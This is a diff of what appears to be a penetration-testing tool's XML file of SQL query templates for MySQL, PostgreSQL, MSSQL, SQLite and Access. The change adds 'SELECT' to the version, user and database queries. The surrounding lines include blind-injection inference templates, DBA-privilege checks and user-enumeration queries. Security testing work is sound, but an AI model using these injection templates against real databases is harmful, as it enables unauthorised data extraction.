@@ -25,9 +25,9 @@
         <substring query="MID((%s), %d, %d)"/>
         <case query="SELECT (CASE WHEN (%s) THEN 1 ELSE 0 END)"/>
         <inference query="AND ORD(MID((%s), %d, 1)) > %d"/>
-        <banner query="VERSION()"/>
-        <current_user query="CURRENT_USER()"/>
-        <current_db query="DATABASE()"/>
+        <banner query="SELECT VERSION()"/>
+        <current_user query="SELECT CURRENT_USER()"/>
+        <current_db query="SELECT DATABASE()"/>
         <is_dba query="(SELECT super_priv FROM mysql.user WHERE user=(SUBSTRING_INDEX(CURRENT_USER(), '@', 1)) LIMIT 0, 1)='Y'"/>
         <check_udf query="(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0, 1)='%s'"/>
         <users>
@@ -160,9 +160,9 @@
         <substring query="SUBSTR((%s)::text, %d, %d)"/>
         <case query="SELECT (CASE WHEN (%s) THEN 1 ELSE 0 END)"/>
         <inference query="AND ASCII(SUBSTR((%s)::text, %d, 1)) > %d"/>
-        <banner query="VERSION()"/>
-        <current_user query="CURRENT_USER"/>
-        <current_db query="CURRENT_DATABASE()"/>
+        <banner query="SELECT VERSION()"/>
+        <current_user query="SELECT CURRENT_USER"/>
+        <current_db query="SELECT CURRENT_DATABASE()"/>
         <is_dba query="(SELECT usesuper=true FROM pg_user WHERE usename=CURRENT_USER OFFSET 0 LIMIT 1)"/>
         <check_udf query="(SELECT proname='%s' FROM pg_proc WHERE proname='%s' OFFSET 0 LIMIT 1)"/>
         <users>
@@ -218,9 +218,9 @@
         <substring query="SUBSTRING((%s), %d, %d)"/>
         <case query="SELECT (CASE WHEN (%s) THEN '1' ELSE '0' END)"/>
         <inference query="AND ASCII(SUBSTRING((%s), %d, 1)) > %d"/>
-        <banner query="@@VERSION"/>
-        <current_user query="SYSTEM_USER"/>
-        <current_db query="DB_NAME()"/>
+        <banner query="SELECT @@VERSION"/>
+        <current_user query="SELECT SYSTEM_USER"/>
+        <current_db query="SELECT DB_NAME()"/>
         <is_dba query="IS_SRVROLEMEMBER('sysadmin')=1"/>
         <users>
             <inband query="SELECT name FROM master..syslogins" query2="SELECT name FROM sys.sql_logins"/>
@@ -276,7 +276,7 @@
         <substring query="SUBSTR((%s), %d, %d)"/>
         <case query="SELECT (CASE WHEN (%s) THEN 1 ELSE 0 END)"/>
         <inference query="AND SUBSTR((%s), %d, 1) > '%s'"/>
-        <banner query="SQLITE_VERSION()"/>
+        <banner query="SELECT SQLITE_VERSION()"/>
         <current_user/>
         <current_db/>
         <is_dba/>
@@ -316,7 +316,7 @@
         <substring query="MID((%s), %d, %d)"/>
         <case query="IIF(%s,1,0)"/>
         <banner/>
-        <current_user query="CURRENTUSER()"/>
+        <current_user query="SELECT CURRENTUSER()"/>
         <current_db/>
         <inference query="AND ASC(MID((%s), %d, 1)) > %d"/>
         <is_dba query="IIF(CURRENTUSER()='Admin',1,0)"/>
